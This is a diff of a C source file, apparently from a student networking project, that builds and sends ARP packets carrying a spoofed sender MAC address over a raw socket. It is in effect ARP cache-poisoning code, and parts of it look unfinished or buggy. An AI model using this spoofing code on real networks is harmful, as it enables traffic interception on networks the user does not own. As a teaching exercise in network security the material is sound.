@@ -6,7 +6,7 @@
 /*   By: guferrei <guferrei@student.42sp.org.br>    +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2024/01/16 17:11:24 by guferrei          #+#    #+#             */
-/*   Updated: 2024/03/25 15:11:28 by guferrei         ###   ########.fr       */
+/*   Updated: 2024/03/25 15:52:26 by guferrei         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -46,8 +46,8 @@
 #define ARP_HDRLEN 28	// ARP header length
 
 struct ether_hdr {
-	u_int8_t	dhost[ETH_ALEN];
-	u_int8_t	shost[ETH_ALEN];
+	u_int8_t	dhost[MAC];
+	u_int8_t	shost[MAC];
 	u_int16_t	type;
 } _ether_hdr;
 
@@ -258,113 +258,6 @@ void	print_ip_n_mac(uint8_t *ip, uint8_t *mac) {
 	}
 }
 
-static int	__hex_char_to_int(char c) {
-	if (c >= '0' && c <= '9')
-		return (c - '0');
-	else if (c >= 'a' && c <= 'f')
-		return (c - 'a' + 10);
-	else if (c >= 'A' && c <= 'F')
-		return (c - 'A' + 10);
-	else
-		return (-1);
-}
-
-static int	__parse_hex_byte(const char *str) {
-	int tens = __hex_char_to_int(str[0]);
-	int ones = __hex_char_to_int(str[1]);
-
-	if (tens < 0 || ones < 0)
-		return (-1);
-	return ((tens << 4) | ones);
-}
-
-int	mac_str_to_binary(const char *str, unsigned char *binary) {
-	const char *ptr = str;
-
-	for (int i = 0; i < 6; i++)
-	{
-		int byte = __parse_hex_byte(ptr);
-		if (byte < 0)
-			return (-1);
-		binary[i] = byte;
-		ptr += 3;
-	}
-	return (0);
-}
-
-void	print_ip(uint8_t *ip) {
-	printf ("IP: %u.%u.%u.%u",
-			ip[0],
-			ip[1],
-			ip[2],
-			ip[3]);
-}
-
-void	print_mac(uint8_t *mac) {
-	for (int i=0; i<6; i++) {
-			printf ("%02x:", mac[i]);
-	}
-}
-
-void	print_request(struct ether_arp *request) {
-	printf("Ether\n\tdhost: ");
-	print_mac(request->ether.dhost);
-	printf("\n\tshost: ");
-	print_mac(request->ether.shost);
-	printf("\n\ttype: %u\n\n", request->ether.type);
-
-	printf("Arp\n\thtype: %u\n\tptype: %u\n\thlen: %u\n\thtype: %u\n\topcode: %u\n\t");
-	printf("sender_mac: ");
-	print_mac(request->arp.sender_mac);
-	printf("\n\tsender_ip: ");
-	print_ip(request->arp.sender_ip);
-	printf("\n\ttarget_mac: ");
-	print_mac(request->arp.target_mac);
-	printf("\n\ttarget_ip: ");
-	print_ip(request->arp.target_ip);
-}
-
-// int	sendSpoofedArpToTarget(struct arp_hdr *arp_request, char *interface, uint8_t *spoofed_mac) {
-// 	struct arp_hdr *spoofed_request;
-// 	struct ether_arp *arp_response;
-// 	struct sockaddr_ll device;
-// 	struct addrinfo hints;
-// 	int sd;
-
-// 	arp_response = ft_calloc(1, sizeof(struct ether_arp));
-
-// 	device.sll_family = AF_PACKET;
-// 	memcpy(device.sll_addr, spoofed_mac, 6 * sizeof(uint8_t));
-// 	device.sll_halen = 6;
-
-// 	memset(&hints, 0, sizeof(struct addrinfo));
-// 	hints.ai_family = AF_INET;
-// 	hints.ai_socktype = SOCK_STREAM;
-// 	hints.ai_flags = hints.ai_flags | AI_CANONNAME;
-
-// 	spoofed_request = malloc(sizeof(struct arp_hdr));
-
-
-
-// 	ft_memcpy(spoofed_request->sender_mac, spoofed_mac, 4 * sizeof(uint8_t));
-// 	if ((sd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0) {
-// 		perror("socket() failed ");
-// 		return(EXIT_FAILURE);
-// 	}
-
-// 	if (sendto(sd, arp_request, sizeof(struct ether_arp), 0, (struct sockaddr *)&device, sizeof(device)) < 0) {
-// 		perror("sendto() failed");
-// 		return(EXIT_FAILURE);
-// 	}
-
-// 	print_request(arp_request);
-
-// 	close(sd);
-// 	printf("ARP Request sended to source successfully\n");
-// 	printf("Preparing to send Spoofed ARP Response to target...\n\n");
-// 	return (0);
-// }
-
 int	sendArpRequest(struct arp_hdr *arp_request, char *interface, uint8_t *source_ip, uint8_t *spoofed_mac) {
 	int	sd, frame_length;
 	struct ether_arp *arp_response;
@@ -372,9 +265,6 @@ int	sendArpRequest(struct arp_hdr *arp_request, char *interface, uint8_t *source
 	struct sockaddr_in *ipv4;
 	struct sockaddr_ll device;
 	uint8_t *ether_frame;
-
-	if (sendSpoofedArpToTarget(arp_request, interface, spoofed_mac))
-		printf("Error sending ARP Request to source");
 
 	memset(&device, 0, sizeof(device));
 	if ((device.sll_ifindex = if_nametoindex(interface)) == 0) {
@@ -389,28 +279,23 @@ int	sendArpRequest(struct arp_hdr *arp_request, char *interface, uint8_t *source
 	hints.ai_socktype = SOCK_STREAM;
 	hints.ai_flags = hints.ai_flags | AI_CANONNAME;
 
-	ft_memcpy(arp_response->arp.sender_ip, arp_request->target_ip, 4 * sizeof(uint8_t));
-	ft_memcpy(arp_response->arp.sender_mac, spoofed_mac, 6 * sizeof(uint8_t));
-	ft_memcpy(arp_response->arp.target_ip, arp_request->sender_ip, 4 * sizeof(uint8_t));
-	ft_memcpy(arp_response->arp.target_mac, arp_request->sender_mac, 6 * sizeof(uint8_t));
 
 	device.sll_family = AF_PACKET;
 	memcpy(device.sll_addr, spoofed_mac, 6 * sizeof(uint8_t));
 	device.sll_halen = 6;
 
-	mac_str_to_binary(arp_request->sender_mac, arp_response->ether.dhost);
-	mac_str_to_binary(spoofed_mac, arp_response->ether.shost);
+	ft_memcpy(arp_response->ether.dhost, arp_request->sender_mac, 6 * sizeof(uint8_t));
+	ft_memcpy(arp_response->ether.shost, spoofed_mac, 6 * sizeof(uint8_t));
 	arp_response->ether.type = htons(ETHERTYPE_ARP);
 
 	arp_response->arp.htype = htons(ARPHRD_ETHER);
 	arp_response->arp.ptype = htons(ETHERTYPE_IP);
 	arp_response->arp.hlen = 6;
 	arp_response->arp.plen = 4;
-	arp_response->arp.opcode = htons(ARPOP_REPLY);
-	mac_str_to_binary(arp_request->target_mac, arp_response->arp.sender_mac);
-	inet_pton(AF_INET, arp_request->target_ip, arp_response->arp.sender_ip);
-	mac_str_to_binary(arp_request->target_mac, arp_response->arp.target_mac);
-	inet_pton(AF_INET, arp_request->target_ip, arp_response->arp.target_ip);
+	arp_response->arp.opcode = htons(ARPOP_REQUEST);
+	ft_memcpy(arp_response->arp.sender_ip, arp_request->target_ip, 4 * sizeof(uint8_t));
+	ft_memcpy(arp_response->arp.sender_mac, spoofed_mac, 6 * sizeof(uint8_t));
+	ft_memcpy(arp_response->arp.target_ip, arp_request->sender_ip, 4 * sizeof(uint8_t));
 
 	if ((sd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0) {
 		perror("socket() failed ");
@@ -421,8 +306,6 @@ int	sendArpRequest(struct arp_hdr *arp_request, char *interface, uint8_t *source
 		perror("sendto() failed");
 		exit(EXIT_FAILURE);
 	}
-
-	print_request(arp_response);
 
 	printf("Finish\n");
 
